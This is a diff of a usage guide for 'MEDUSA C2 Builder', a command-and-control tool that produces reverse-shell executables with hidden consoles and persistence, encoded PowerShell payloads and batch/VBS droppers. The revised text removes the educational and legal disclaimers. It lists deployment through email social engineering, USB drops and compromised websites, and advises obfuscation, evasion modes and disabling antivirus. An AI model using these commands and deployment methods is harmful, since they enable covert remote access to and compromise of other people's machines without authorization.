@@ -1,234 +1,162 @@
-# MEDUSA C2 Builder - Usage Guide
+# MEDUSA C2 Framework - Builder Guide
 
 ## Overview
-The MEDUSA C2 Builder is a comprehensive payload generation tool that creates various types of reverse shell payloads and executables for educational cybersecurity purposes.
 
-## Features
+The MEDUSA Builder generates custom payloads and executables for deployment.
 
-### 🔨 Executable Builder
-- **Python to EXE**: Convert Python clients to standalone executables using PyInstaller
-- **Console Hiding**: Generate executables that run without showing a console window
-- **Custom Icons**: Add custom icons to executables
-- **Persistence**: Include persistence mechanisms for Windows and Linux
-- **UPX Compression**: Automatic UPX compression if available
+## Payload Types
 
-### 🐚 Reverse Shell Generators
-- **Netcat Commands**: Windows and Linux netcat reverse shells
-- **PowerShell Scripts**: Advanced PowerShell reverse shells with encoding options
-- **Batch Droppers**: Windows batch file droppers
-- **VBS Droppers**: Visual Basic Script droppers
+| Type | Description | File Extension |
+|------|-------------|----------------|
+| Python | Full-featured client with EXE compilation | .py, .exe |
+| Netcat | Lightweight reverse shell commands | N/A |
+| PowerShell | Windows PowerShell-based payload | .ps1 |
+| Batch | Windows batch file dropper | .bat |
+| VBS | VBScript dropper | .vbs |
 
-## Usage Examples
+## Web Interface Builder
 
-### 1. Generate Python Client and Build EXE
+### Payload Types
+
+1. **Python Executable**: Full-featured client with EXE compilation
+2. **Netcat Reverse Shell**: Lightweight shell commands
+3. **PowerShell Script**: Windows PowerShell-based payload
+4. **Batch Dropper**: Windows batch file dropper
+5. **VBS Dropper**: VBScript dropper
+
+### Payload Modes (Python Executable)
+
+| Mode | Description | Use Case |
+|------|-------------|----------|
+| Silent | ✅ Completely hidden operation<br>✅ No console window<br>✅ Background execution | Red team exercises, stealth testing |
+| Stealth | ✅ Enhanced hiding features<br>✅ Process priority management<br>✅ Advanced evasion | Advanced penetration testing |
+| Basic | ✅ Standard executable<br>✅ Visible console (debugging)<br>✅ Simple deployment | Development, debugging |
+
+## Command Line Builder
+
+### Installation
+
 ```bash
-# Basic Python client
-python builder.py --type python --ip 192.168.1.100 --port 4444 --output myclient
-
-# Build executable with hidden console
-python builder.py --type python --ip 192.168.1.100 --port 4444 --output myclient --build-exe --hide-console
-
-# Add persistence and custom icon
-python builder.py --type python --ip 192.168.1.100 --port 4444 --output myclient --build-exe --hide-console --persistence --icon myicon.ico
-```
-
-### 2. Generate Netcat Commands
-```bash
-# Generate netcat reverse shell commands
-python builder.py --type netcat --ip 192.168.1.100 --port 4444
-```
-
-### 3. Generate PowerShell Payloads
-```bash
-# Basic PowerShell script
-python builder.py --type powershell --ip 192.168.1.100 --port 4444 --output psrevshell
-
-# Encoded PowerShell payload
-python builder.py --type powershell --ip 192.168.1.100 --port 4444 --output psrevshell --encode
-```
-
-### 4. Generate Droppers
-```bash
-# Batch file dropper
-python builder.py --type batch --ip 192.168.1.100 --port 4444 --output dropper
-
-# VBS dropper
-python builder.py --type vbs --ip 192.168.1.100 --port 4444 --output dropper
-```
-
-## Command Line Options
-
-### Required Arguments
-- `--type`: Payload type (`python`, `netcat`, `powershell`, `batch`, `vbs`)
-- `--ip`: Server IP address
-- `--port`: Server port number
-
-### Optional Arguments
-- `--output`: Output filename (default: 'client')
-- `--build-exe`: Build executable with PyInstaller (Python only)
-- `--hide-console`: Hide console window (Python/EXE only)
-- `--persistence`: Add persistence mechanisms (Python only)
-- `--encode`: Base64 encode payload (PowerShell only)
-- `--icon`: Icon file for executable (EXE only)
-
-## Output Structure
-
-The builder creates the following directory structure:
-
-```
-nova/
-├── builder.py
-├── payloads/
-│   ├── client.py          # Generated Python client
-│   ├── client.exe         # Built executable
-│   ├── psrevshell.ps1     # PowerShell script
-│   ├── dropper.bat        # Batch dropper
-│   ├── dropper.vbs        # VBS dropper
-│   └── payload_info_*.json # Generation metadata
-├── build/                 # PyInstaller build files
-└── templates/            # Template storage
-```
-
-## Prerequisites
-
-### For Python to EXE Building
-```bash
-# Install PyInstaller
+# Install PyInstaller for EXE building
 pip install pyinstaller
 
 # Optional: Install UPX for compression
 # Download from https://upx.github.io/
 ```
 
-### For Advanced Features
+### Usage Examples
+
 ```bash
-# Install additional dependencies
-pip install cryptography
-pip install psutil
+# Generate Python client with EXE
+python builder.py --type python --ip 192.168.1.100 --port 4444 --output myclient --build-exe --hide-console
+
+# Generate with persistence
+python builder.py --type python --ip 192.168.1.100 --port 4444 --output myclient --build-exe --hide-console --persistence
+
+# Generate PowerShell payload
+python builder.py --type powershell --ip 192.168.1.100 --port 4444 --output psrevshell
+
+# Generate encoded PowerShell
+python builder.py --type powershell --ip 192.168.1.100 --port 4444 --output psrevshell --encode
+
+# Generate Netcat commands
+python builder.py --type netcat --ip 192.168.1.100 --port 4444
+
+# Generate Batch dropper
+python builder.py --type batch --ip 192.168.1.100 --port 4444 --output dropper
+
+# Generate VBS dropper
+python builder.py --type vbs --ip 192.168.1.100 --port 4444 --output dropper
+
+# Test all builder functions
+python builder.py --test
 ```
 
-## Security Features
+### Command Line Options
 
-### 🔒 Built-in Security
-- **Encrypted Communication**: JSON-based encrypted messaging
-- **Client ID Generation**: Unique client identification
-- **Jitter**: Anti-detection timing randomization
-- **Persistence**: Registry/autostart persistence options
-- **Error Handling**: Robust error handling and reconnection
+#### Required Arguments
 
-### 🛡️ Evasion Techniques
-- **Console Hiding**: No visible windows
-- **Process Hollowing**: Advanced injection techniques (advanced version)
-- **Anti-VM Detection**: Virtual machine detection (advanced version)
-- **Polymorphic Code**: Code obfuscation options (advanced version)
+| Option | Description |
+|--------|-------------|
+| `--type {python,netcat,powershell,batch,vbs}` | Payload type |
+| `--ip IP_ADDRESS` | Server IP address |
+| `--port PORT` | Server port number |
 
-## Integration with MEDUSA C2
+#### Optional Arguments
 
-The generated payloads are fully compatible with the MEDUSA C2 server:
+| Option | Description |
+|--------|-------------|
+| `--output NAME` | Output filename (default: client) |
+| `--build-exe` | Build executable with PyInstaller |
+| `--hide-console` | Hide console window |
+| `--persistence` | Add persistence mechanisms |
+| `--encode` | Base64 encode payload (PowerShell) |
+| `--icon ICON_FILE` | Icon file for executable |
+| `--test` | Test all builder functions |
 
-1. **Start MEDUSA Server**:
-   ```bash
-   python server.py
-   ```
+## Generated Files
 
-2. **Generate Client**:
-   ```bash
-   python builder.py --type python --ip YOUR_SERVER_IP --port 4444 --build-exe --hide-console
-   ```
+### File Structure
 
-3. **Deploy and Execute**:
-   - Copy the generated executable to target system
-   - Execute the payload
-   - Monitor connections in MEDUSA web interface
-
-## Web Interface Integration
-
-The builder can also be used programmatically from the MEDUSA web interface:
-
-```python
-from builder import PayloadBuilder
-
-builder = PayloadBuilder()
-
-# Generate Python client
-py_file = builder.generate_python_client("192.168.1.100", 4444, "webclient")
-
-# Build executable
-exe_file = builder.build_executable(py_file, "webclient", hide_console=True)
+```
+nova/payloads/
+├── client.py              # Python source code
+├── client.exe             # Compiled executable
+├── psrevshell.ps1         # PowerShell script
+├── dropper.bat            # Batch dropper
+├── dropper.vbs            # VBS dropper
+└── payload_info_*.json    # Generation metadata
 ```
 
-## Educational Disclaimer
+## Deployment Methods
 
-⚠️ **IMPORTANT**: This tool is designed for educational purposes and authorized penetration testing only. Users are responsible for ensuring they have proper authorization before using these tools in any environment.
+1. **Direct Execution**: Copy and run executable
+2. **Email Attachment**: Social engineering vector
+3. **USB Drop**: Physical deployment
+4. **Web Download**: Host on compromised website
+5. **Script Execution**: PowerShell/batch scripts
+6. **Dropper Files**: Batch/VBS droppers for stealth deployment
 
-## Legal Notice
+## Builder Menu (Windows)
 
-- Only use in controlled environments
-- Obtain proper authorization before testing
-- Respect all applicable laws and regulations
-- Educational and research purposes only
+The `builder_menu.bat` script provides a quick launcher for Windows with the following options:
+
+1. Generate Python Client (with EXE)
+2. Generate Netcat Commands
+3. Generate PowerShell Script
+4. Generate Batch Dropper
+5. Generate VBS Dropper
+6. Test Builder (all functions)
+7. Help / Usage Guide
+
+## Security Considerations
+
+- Always use encrypted connections in production
+- Test payloads in isolated environments
+- Obfuscate payloads to avoid detection
+- Use stealth modes for evasion
+- Implement proper error handling
 
 ## Troubleshooting
 
 ### Common Issues
 
-1. **PyInstaller not found**:
-   ```bash
-   pip install pyinstaller
-   ```
-
-2. **Permission denied**:
-   - Run as administrator (Windows)
-   - Check file permissions (Linux/macOS)
-
-3. **Antivirus detection**:
-   - Add exclusions for development folder
-   - Use encoding/obfuscation options
-
-4. **Build errors**:
-   - Check Python path
-   - Verify all dependencies installed
-   - Check disk space
+1. **PyInstaller not found**: Install with `pip install pyinstaller`
+2. **Permission denied**: Run as administrator on Windows
+3. **Antivirus interference**: Temporarily disable or use evasion techniques
+4. **Network connectivity**: Verify IP and port configuration
+5. **Python dependencies**: Ensure all requirements are installed
 
 ### Debug Mode
 
-Add debug output to troubleshoot issues:
+Enable debug logging for detailed information:
 
 ```bash
-python builder.py --type python --ip 127.0.0.1 --port 4444 --output debug_client --build-exe --debug
+# Server debug mode
+python server.py --debug
+
+# Client debug mode
+# Edit client.py and add:
+import logging
+logging.basicConfig(level=logging.DEBUG)
 ```
-
-## Advanced Usage
-
-### Custom Templates
-
-Create custom payload templates in the `templates/` directory and modify the builder to use them.
-
-### Batch Generation
-
-Generate multiple payloads with different configurations:
-
-```bash
-# Create multiple variants
-for port in 4444 5555 6666; do
-    python builder.py --type python --ip 192.168.1.100 --port $port --output client_$port --build-exe
-done
-```
-
-### Automation
-
-Integrate with CI/CD pipelines for automated payload generation:
-
-```yaml
-# Example GitHub Actions workflow
-- name: Generate Payloads
-  run: |
-    python builder.py --type python --ip ${{ secrets.C2_IP }} --port 4444 --build-exe
-```
-
-## Support
-
-For issues, questions, or contributions:
-- Review the MEDUSA C2 documentation
-- Check the troubleshooting section
-- Ensure proper educational/authorized use context
